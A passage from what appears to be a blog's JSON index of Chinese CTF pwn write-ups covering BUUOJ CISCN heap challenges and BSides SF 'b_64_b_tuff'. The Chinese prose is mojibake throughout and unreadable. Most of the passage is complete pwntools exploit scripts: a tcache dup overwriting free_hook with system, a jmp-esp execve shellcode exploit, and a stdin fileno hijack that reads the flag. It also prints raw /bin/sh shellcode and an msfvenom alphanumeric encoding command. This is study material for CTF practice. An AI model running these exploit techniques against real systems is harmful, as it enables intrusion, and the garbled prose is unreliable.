çš„ä½œä¸ºreadè¿”å›åœ°å€ï¼Œé‚£æ ·å°±ä¸å¯æ§äº†ã€‚è¿™é‡Œé€‰æ‹©ç³»ç»Ÿè°ƒç”¨æ˜¯å› ä¸ºæ²¡æœ‰readåœ¨gotè¡¨ä¸­çš„çœŸå®åœ°å€ï¼Œä¸ç„¶å…¶å®è°ƒç”¨gotè¡¨åœ°å€ä¹Ÿå¯ä»¥ã€‚\n\n \n\n12.æ¥ç€è°ƒç”¨systemå‡½æ•°ï¼ŒåŒæ ·é‡‡ç”¨syscallç³»ç»Ÿè°ƒç”¨ï¼Œéœ€è¦å‡ ä¸ªå‚æ•°çš„è®¾ç½®rax=59,rdx=0,rsi=0,ï¼ˆè¿™æ˜¯è°ƒç”¨syscallå¿…é¡»çš„å‰ç½®æ¡ä»¶ï¼Œå› ä¸ºæ˜¯linuxè§„å®šçš„ï¼Œå¯ä»¥ä¸Šç½‘æŸ¥ä¸€ä¸‹å°±çŸ¥é“ï¼‰ã€‚éƒ½å¯ä»¥é€šè¿‡Pop gadgetæ¥å®ç°ï¼Œä¹‹åä¼ å‚rdiä¸º&bufï¼Œæœ€åè°ƒç”¨å³å¯getshellã€‚(59ä¸ºç³»ç»Ÿè°ƒç”¨å·)æ‰€ä»¥ç´§æ¥ç€çš„payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549760.jpeg)è¿™é‡Œå°±å¿…é¡»çš„è®¾ç½®raxä¸º0x3bäº†ã€‚\n\nâ–²shä¸èƒ½ç”¨æ¥ä¼ ç»™syscallå¼€shellï¼Œä½†æ˜¯int 0x80å¯ä»¥ã€‚syscall-64ï¼Œint 0x80-32ã€‚\n\nâ–²syscallæ˜¯åœ¨ä¸Šè¿›å…¥å†…æ ¸æ¨¡å¼çš„é»˜è®¤æ–¹æ³•x86-64ã€‚è¯¥æŒ‡ä»¤åœ¨Intelå¤„ç†å™¨çš„ 32ä½æ“ä½œæ¨¡å¼ä¸‹ä¸å¯ç”¨ã€‚sysenteræ˜¯æœ€å¸¸ç”¨äºä»¥32ä½æ“ä½œæ¨¡å¼è°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„æŒ‡ä»¤ã€‚å®ƒç±»ä¼¼äºsyscallï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥æœ‰ç‚¹å›°éš¾ï¼Œä½†è¿™æ˜¯å†…æ ¸çš„å…³æ³¨ç‚¹ã€‚int 0x80 æ˜¯è°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„ä¼ ç»Ÿæ–¹å¼ï¼Œåº”é¿å…ä½¿ç”¨ï¼Œæ˜¯32ä½ç¨‹åºä¸‹çš„ã€‚\n\nç³»ç»Ÿè°ƒç”¨æŸ¥è¯¢ç½‘å€ï¼šhttps://syscalls.w3challs.com/\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•2","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•2/","content":"\n1.ciscn_2019_es_1ï¼šUAFï¼Œtcache dupï¼Œæ¯”è¾ƒå¸¸è§„ï¼Œæ³„éœ²åœ°å€ï¼Œæ‰“free_hookã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_es_1\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27956\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size, con, call):\n    sla(menu, \"1\")\n    sla(\"compary's name\\n\", str(size))\n    sa(\"name:\\n\", con)\n    sla(\"compary call:\\n\", str(call))\n\ndef delete(idx):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\n#main_arena_off = 0x3ebc40\n\nadd(0x410,\"A\",123) #0\nadd(0x18,\"B\",123) #1\nadd(0x08,\"/bin/sh\\x00\",123) #2\n\ndelete(0)\nshow(0)\nru(\"name:\\n\")\nmalloc_hook = u64(rc(6).ljust(8,\"\\x00\")) - 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\",malloc_hook)\nlibc_base = malloc_hook - obj.dump(\"__malloc_hook\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nfree_hook = libc_base + obj.dump('__free_hook')\nsystem_addr = libc_base + obj.dump('system')\ndelete(1)\ndelete(1)\nadd(0x18,p64(free_hook),123) #3\nadd(0x18,p64(system_addr),123) #4\nadd(0x18,p64(system_addr),123) #5\ndelete(2)\npause()\np.interactive()\n```\n\n2.ciscn_s_9ï¼šè¿™é¢˜æœ‰ç‚¹æ„æ€ï¼Œæ ˆæº¢å‡ºé•¿åº¦æ¯”è¾ƒçŸ­ï¼Œä½†æ˜¯è¿˜æ˜¯å¤Ÿç”¨æ¥æ³„éœ²åœ°å€ç„¶året2libcã€‚é™¤æ­¤ä¹‹å¤–é¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªhintï¼Œå¯ä»¥ç›´æ¥å€Ÿç”¨jump espè¿™ä¸ªgadgetæ¥æ‰‹å†™shellcodeï¼Œæ‹‰åŠ¨espä¸Šç§»åˆ°æˆ‘ä»¬è¾“å…¥ä½ç½®ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦è€ƒè™‘åˆ°åŠ«æŒebpä¸ŠæŒªä¹‹åçš„å‡½æ•°å‰©ä¸‹çš„æ±‡ç¼–ä»£ç ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_s_9\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26029\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n#sh has been in ELF\n'''\nsh_addr = 0x080482EA\npayload = \"\"\npayload += \"A\"*(0x48+0x4)\npayload += p32(system_plt)\npayload += p32(0x11111111) #paddding(system_plt ret addr)\npayload += p32(sh_addr)\n'''\n\n\n#sh not in ELF\n'''\npayload = \"\"\npayload += \"A\"*0x10\npayload += p32(read_plt)\npayload += p32(system_plt)\npayload += p32(0x1) #fd\npayload += p32(binsh_addr) #parameter\npayload += p32(0x4) #n\npayload += p32(binsh_addr)\n'''\n\n#leak addr\n'''\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p32(puts_plt)\npayload1 += p32(main_addr)\npayload1 += p32(puts_got)\n\npayload2 = \"\"\npayload2 = \"A\"*0x10\npayload2 += p32(system_plt)\npayload2 += p32(0x11111111) #paddding(system_plt ret addr)\npayload2 += p32(binsh_addr)\n'''\n\njump_esp = 0x08048554\n\nshellcode= '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nxor eax,eax\nmov al,0xB\nint 0x80\n'''\nshellcode=asm(shellcode)\n\npayload = \"\"\npayload += shellcode\npayload = payload.ljust(0x24,\"A\")\npayload += p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n\nru(\">\\n\")\npause()\nsl(payload)\npause()\np.interactive()\n```\n\n3.ciscn_final_2ï¼šè¿™é¢˜çœŸæ˜¯æœ€æœ‰æ„æ€äº†ï¼Œè°ƒäº†æˆ‘å¿«ä¸€å¤©ã€‚\n\n(1)boolå…¬ç”¨ï¼Œdup freeä¹‹å‰å¿…é¡»å…ˆç”³è¯·ã€‚\n\n(2)int_ptå’Œshort_int_ptå…¨å±€ã€‚\n\n(3)å¼€äº†seccompä¿æŠ¤ï¼Œä½†æ˜¯æœ€å¼€å§‹åŠ è½½äº†flagï¼Œå¥æŸ„fdè®¾ç½®ä¸º666ã€‚\n\nâ–²æ¼æ´åœ¨æ²¡æœ‰æ¸…ç©ºæŒ‡ä»¤ï¼Œå¯ä»¥UAFå’Œtcache dupã€‚å…ˆå¸¸è§„æ€è€ƒä¸€ä¸‹æ€è·¯ï¼ŒUAFå’Œtcache dupæ³„éœ²å †åœ°å€ï¼Œä¹‹åæ„é€ chunkè¿›å…¥unsortedbinä¸­ï¼Œæ³„éœ²libcåœ°å€ï¼Œç„¶ååˆ©ç”¨å †å—ä¸Šæ®‹ç•™çš„libcåœ°å€éƒ¨åˆ†å†™è¦†ç›–_IO_2_2_stdin_ç»“æ„ä½“ä¸­çš„filenoä¸º666ï¼Œè¿™æ ·åœ¨choice>4å°±å¯ä»¥åˆ©ç”¨scanfæ¥ç›´æ¥è¯»å–å¥æŸ„fdä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagï¼Œé¡ºå¸¦æ‰“å°å‡ºæ¥ã€‚\n\nå…¶å®ƒä¸è¯´ï¼Œéœ€è¦æ³¨æ„çš„ä¹Ÿå°±æ˜¯ä¸€ä¸ªprintfçš„æ ¼å¼åŒ–è¾“å‡ºï¼Œæ³„éœ²å †åœ°å€çš„æ—¶å€™ç”¨intæ¥æ”¶ï¼Œç„¶ååˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å°äº0ï¼Œå°äº0åˆ™åŠ ä¸Š0x100000000å³å¯ã€‚\n\nä¸»è¦è¯´libcåœ°å€æ³„éœ²å’Œåˆ©ç”¨ã€‚è¿™é‡Œåˆ©ç”¨éƒ¨åˆ†å †åœ°å€è¿›è¡Œä¸€å®šå †å¸ƒå±€ï¼Œä¿®æ”¹int_chunkçš„sizeä¸º0x4b1ï¼Œè¿™é‡Œæˆ‘å¼„å¤§äº†ï¼Œåªè¦è¶…è¿‡tcacheæœ€å¤§é™åˆ¶å³å¯ã€‚(ç„¶åæˆ‘çœ‹ç½‘ä¸Šå¸¸è§„æ€è·¯éƒ½æ˜¯å¡«æ»¡å¤§äºfastbinçš„tcacheï¼Œä½†æ˜¯æˆ‘å«Œæ¯”è¾ƒéº»çƒ¦ï¼Œå°±ç”¨äº†è‡ªå·±çš„æ–¹æ³•ï¼Œäº‹å®è¯æ˜å¤§ä½¬çš„æ–¹æ³•å…¶å®æ›´æœ‰æ•ˆï¼Œæ¯”è¾ƒä¸å®¹æ˜“å‡ºé”™)ç„¶åå°±æ¯”è¾ƒå‘çˆ¹äº†ã€‚\n\nâ‘ ç”±äºåªæœ‰éƒ¨åˆ†libcåœ°å€ï¼Œæ‰€ä»¥ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€æ˜¯çˆ†ç ´ï¼Œ0x7fxx--------ï¼Œéœ€è¦å¤§æ¦‚çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œ0xffæ¬¡ã€‚äºŒæ˜¯åˆ©ç”¨chunkä¸Šæ®‹ç•™çš„åœ°å€ï¼Œç»“åˆtcache upå’ŒUAFç›´æ¥æ”¹åé¢å››ä¸ªå­—èŠ‚ï¼Œç›´æ¥ç”³è¯·åˆ°æˆ‘ä»¬æƒ³è¦åœ°æ–¹ã€‚è¿™é‡Œç”¨ç¬¬äºŒç§æ–¹æ³•\n\nâ‘¡ä½†æ˜¯æœ€å‘çˆ¹çš„å°±æ˜¯ï¼Œscanfç”³è¯·å †å—å•Šï¼Œå…·ä½“ä¸çŸ¥é“ç”³è¯·å¤šå¤§ï¼Œä½†æ˜¯ç¨‹åºä¸­å¯ä»¥è¾“å…¥99ä¸ªå­—ç¬¦ï¼Œè°ƒè¯•äº†å¥½ä¹…ï¼ŒæŒ‡å®šä¼šç”³è¯·å †å—ã€‚\n\nâ‘¢å¦‚æœç›´æ¥åˆ©ç”¨int_chunkä¸Šæ®‹ç•™çš„libcåœ°å€ï¼Œä½†æ˜¯è¿™æ—¶å€™int_chunkå·²ç»è¢«æ”¾å…¥åˆ°unsortedbinä¸­ï¼Œç»“åˆtcache upå’ŒUAFåŠ¿å¿…ä¼šä¿®æ”¹int_chunkçš„fdï¼Œç„¶åå°±ä¼šé€ æˆunsortedbinè¢«ç ´åï¼Œå†åŠ ä¸Šä¹‹åçš„scanfç”³è¯·å †å—ï¼Œä¸ä¼šä»0x20å’Œ0x30çš„tcacheä¸­ç”³è¯·ï¼Œå¾—ï¼Œç›´æ¥å´©æºƒï¼š\n\nmalloc(): memory corruption: 0x00007fae88dc8c10 ***\\n\"\n\nâ‘£ç„¶åæˆ‘åˆæƒ³åˆ°è¦ä¸ä¸ºscanfé¢„ç•™ä¸€ä¸ªchunkåˆ°tcacheä¸­ï¼Ÿè¿™æ ·å°±ä¸ä¼šä»unsortedbinä¸­åˆ‡å‰²äº†ã€‚ç»“æœè°ƒå¥½ä¹…æ²¡è°ƒå‡ºæ¥ï¼Œæœæ–­æ”¾å¼ƒã€‚\n\nâ‘¤æœ€åçµå…‰ä¸€é—ªï¼Œæƒ³åˆ°å¹²å˜›ä¸ç›´æ¥åŠ«æŒtcacheç»“æ„ä½“ï¼Œç”±äºint_chunkè¢«æ”¾å…¥unsortedbinä¸­ï¼Œé‚£ä¹ˆå¦‚æœint_chunkä¹Ÿåœ¨tcacheä¸­ï¼Œå°±å¯ä»¥ä½¿å¾—tcacheç»“æ„ä½“ä¸­0x30é“¾è¡¨ä¸Šç•™ä¸‹main_arena+96çš„æŒ‡é’ˆäº†å•Šã€‚è¿™æ ·å†ç”³è¯·short_chunkåˆ°è¿™é‡Œï¼Œç›´æ¥ä¿®æ”¹æŒ‡é’ˆï¼Œå†ç”³è¯·int_chunkå°±ä¼šç”³è¯·åˆ°æˆ‘ä»¬ä¿®æ”¹çš„åœ°æ–¹ï¼Œè¿™æ ·å°±ä¸ä¼šé€ æˆunsortedbinç ´åã€‚\n\nâ–²çœ‹äº†å¤§ä½¬çš„ï¼Œè¿˜æ˜¯ç›´æ¥å¡«æ»¡tcacheçœäº‹ï¼Œä¸ç ´åunsortedbinã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_2\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"29139\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"which command?\\n> \"\n\n\ndef add(Type, con):\n    sla(menu, \"1\")\n    sla(\">\", str(Type))\n    sa(\"your inode number:\", con)\n\ndef delete(Type):\n    sla(menu, \"2\")\n    sla(\">\", str(Type))\n\ndef show(Type):\n    sla(menu, \"3\")\n    sla(\">\", str(Type))\n\ndef exit(con):\n    sla(menu,\"4\")\n    #sa(\"at last?\\n\",con)\n\n\nadd(1,\"B\")\ndelete(1)\n\nfor i in range(0,5):\n    add(2,\"A\")\n    delete(1)\n\nshow(1)\nru(\"type inode number :\")\nheap_low_four = int(ru(\"\\n\"))\nif(heap_low_four<0):\n    heap_low_four += 0x100000000\nlog.info(\"heap_low_four:0x%x\"%heap_low_four)\n\nfor i in range(0,3):\n    add(1,str(heap_low_four))\n    delete(2)\n\nadd(2,str(heap_low_four-0x10))\nadd(2,str(heap_low_four-0x10))\nadd(2,str(0x4b1))\n\n#fill\nfor i in range(0,32):\n    add(2,str(0x51))\n\ndelete(2)\nadd(1,str(heap_low_four))\nadd(1,str(heap_low_four))\ndelete(1)\nshow(1)\nru(\"type inode number :\")\n\nmalloc_hook = int(ru(\"\\n\"))- 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n\nlibc_base_four = malloc_hook - obj.dump('__malloc_hook')\nif(libc_base_four<0):\n    libc_base_four += 0x100000000\nheap_base = heap_low_four-0x260\nlog.info(\"libc_base_four:0x%x\"%libc_base_four)\n__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(\"_IO_2_1_stdin_\")+0x70\n\nadd(1,str(malloc_hook+0x10+96))\ndelete(2)\nadd(2,str(heap_base+0x50+0x8))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(1,str(666))\n\npause()\n\np.sendline(\"4\")\np.interactive()\n```\n\nè¿™é‡Œæˆ‘éƒ½æ˜¯int_chunkæ‹¿æ¥æ³„éœ²åœ°å€å’Œåˆ©ç”¨ï¼Œshort_chunkæ¥æ‰“è¾…åŠ©ã€‚\n\nâ˜…å¦å¤–è®°å½•ä¸‹tcacheæ–¹é¢çš„ï¼Œtcacheæ ¹æºåœ¨äºtcacheç»“æ„ä½“ï¼Œæ‰€ä»¥å¦‚æœtcacheçš„binä¸­å¦‚ä¸‹ï¼š\n\n0x20[]:chunkA->chunkA.fd=1\n\né‚£ä¹ˆå¦‚æœè¿™æ—¶å€™ç”³è¯·chunkAçš„åŒæ—¶ä¿®æ”¹chunkA.fd=2ï¼Œå¯¹äºçš„tcacheçš„binä¸­åªä¼šæ˜¯ï¼š\n\n0x20[]:chunkA.fd=1ï¼Œè€Œä¸æ˜¯chunkA.fd=2ï¼Œå› ä¸ºåœ¨mallocæ—¶å°±å·²ç»å°†chunkA.fd=1æ”¾åˆ°tcacheç»“æ„ä½“ä¸­äº†ï¼Œå†ä¿®æ”¹chunkA.fdæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œåªèƒ½ä¿®æ”¹tcacheç»“æ„ä½“æ‰è¡Œã€‚\n\nâ˜…è¿˜æœ‰tcacheçš„coutå­—æ®µä¸€ç›´æ˜¯ä¸ªè°œï¼Œå¦‚æœcout>7ï¼Œtcacheçš„maxå®å®šä¹‰æ²¡æœ‰è¢«æ”¹ï¼Œé‚£ä¹ˆé‡Šæ”¾åçš„chunkæ˜¯ä¸ä¼šè¿›å…¥å¯¹äºçš„tcacheçš„binä¸­ã€‚ä½†æ˜¯å¦‚æœcout<7æˆ–è€…<0ï¼Œæ˜¯ä¸ä¼šæœ‰å…¶ä»–å½±å“çš„ï¼Œåªä¼šçœ‹tcacheç»“æ„ä½“ä¸­å¯¹åº”binçš„é“¾è¡¨ä¸­æ˜¯ä¸æ˜¯0x0ã€‚æ˜¯å°±å½“æ²¡æœ‰ï¼Œæœ‰æ•°æ®åˆ™å°±æœ‰chunkåœ¨è¯¥binä¸­ï¼Œä¸ç®¡coutæ˜¯å¤šå°‘(<7)ï¼Œå¹¶ä¸”mallocæˆ–è€…freeåä¼šå¯¹coutå¯¹åº”åŠ å‡ã€‚(ä¸åŒlibcç‰ˆæœ¬å¥½åƒåˆä¸å¤ªä¸€æ ·ï¼Œå…·ä½“è°ƒè¯•)\n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"BSides San Francisco CTF 2017-b_64_b_tuff","url":"/2021/08/14/BSides San Francisco CTF 2017-b_64_b_tuff/","content":"\n \n\n1.å¸¸è§„checksecä¸‹ï¼Œåªå¼€äº†NXï¼Œä¹‹åIDAæ‰“å¼€æ–‡ä»¶ä¹‹åï¼Œæœ‰å¦‚ä¸‹è¯­å¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ns = (char *)base64_encode((int)buf, v7, v5);\n((void (*)(void))v5)();\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg)\n\nè¿™é‡Œv7æ˜¯è¾“å…¥çš„Bufï¼Œv5æ˜¯mmapåˆ†é…çš„å†…å­˜ç©ºé—´ã€‚ä¹‹åçš„è¯­å¥ï¼šä»£è¡¨äº†å°†v5å¯¹åº”çš„å†…å­˜ç©ºé—´å¼ºåˆ¶è½¬åŒ–ä¸ºå‡½æ•°æŒ‡é’ˆå¹¶ä¸”è°ƒç”¨ï¼Œåœ¨æ±‡ç¼–ä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼šè¿™é‡Œçš„[ebp+var_18]å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„bufç»è¿‡ç¼–ç base64ç¼–ç åå­˜æ”¾çš„åœ°æ–¹ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ntext:0804879C var_18          = dword ptr -18h\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg)\n\n3.æ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å°±æˆäº†ä¼šè¢«æ‰§è¡Œçš„æ±‡ç¼–ä»£ç ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è¾“å…¥Shellcodeï¼Œæ¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ã€‚è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªè¿æ¥ç½‘å€ï¼Œä»é‡Œé¢æ‰¾shellcodeï¼š\n\nhttp://shell-storm.org/shellcode/\n\nå¯ä»¥é€šè¿‡linux/x86/sh/bash/execve/shellcodeç­‰ç­‰å…³é”®è¯æ¥æŸ¥æ‰¾ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªå¯ç”¨çš„shellcode:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg)\n\n \n\n```\n#æ³¨é‡Šå¤´\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n```\n\n4.ä½†æ˜¯æœ‰Base64_encodeï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„éœ€è¦ä¼šè¢«base64ç¼–ç ï¼Œè€Œbase64ç¼–ç åªèƒ½ç”±åªç”±0-9ï¼Œa-zï¼ŒA-Zï¼Œ+ï¼Œ/è¿™äº›å­—ç¬¦ç»„æˆï¼Œ(è¿™é‡Œå°±æ˜¯å¯¹åº”çš„asciiè½¬æ¢è¡¨ä¸­å†…å®¹)æ‰€ä»¥å¸¸è§„çš„shellcodeå°±ä¸åˆæ ¼ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰ä¸­çš„shellcodeä¸­æŸäº›å­—ç¬¦å°±æ²¡åŠæ³•è¢«base64ç¼–ç ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°msfvenomæ¥é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ç¼–ç å™¨ï¼Œå°†æˆ‘ä»¬å¸¸è§„çš„shellcodeç¼–ç æˆå¯ä»¥è¢«base64ç¼–ç çš„shellcodeã€‚\n\n5.æ‰“å¼€Linuxï¼Œè¾“å…¥msfvenom -l encoderså¯ä»¥æŸ¥çœ‹ç¼–ç å™¨ï¼Œåé¢æœ‰ä»‹ç»ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œä»ä¸­é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ç¼–ç å™¨å¯¹shellcodeè¿›è¡Œç¼–ç å³å¯ã€‚\n\n6.æŸ¥åˆ°x86/alpha_mixedè¿™ä¸ªç¼–ç å™¨å¯ä»¥å°†æˆ‘ä»¬è¾“å…¥çš„shellcodeç¼–ç æˆå¤§å°å†™æ··åˆçš„ä»£ç ï¼Œç¬¦åˆæ¡ä»¶ã€‚\n\nx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder\n\nè¿è¡Œç¼–ç å™¨çš„ä»£ç å¦‚ä¸‹ï¼š\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n\n7.è¾“å…¥è¿™æ®µä»£ç è¿è¡Œä¹‹åå¯ä»¥çœ‹åˆ°å½“å‰æ–‡ä»¶å¤¹ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªpayloadæ–‡ä»¶ï¼Œæ–‡æœ¬æ‰“å¼€å°±å¯ä»¥çœ‹åˆ°ç¼–ç åçš„shellcode:\n\nPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA\n\n8.ä¹‹åéœ€è¦å°†è¿™æ®µå¯ä»¥è¢«Base64ç¼–ç çš„è¿›è¡ŒBase64è§£ç ï¼Œå¾—åˆ°çš„shellcodeå†è¢«ç¨‹åºä¸­çš„Base64ç¼–ç 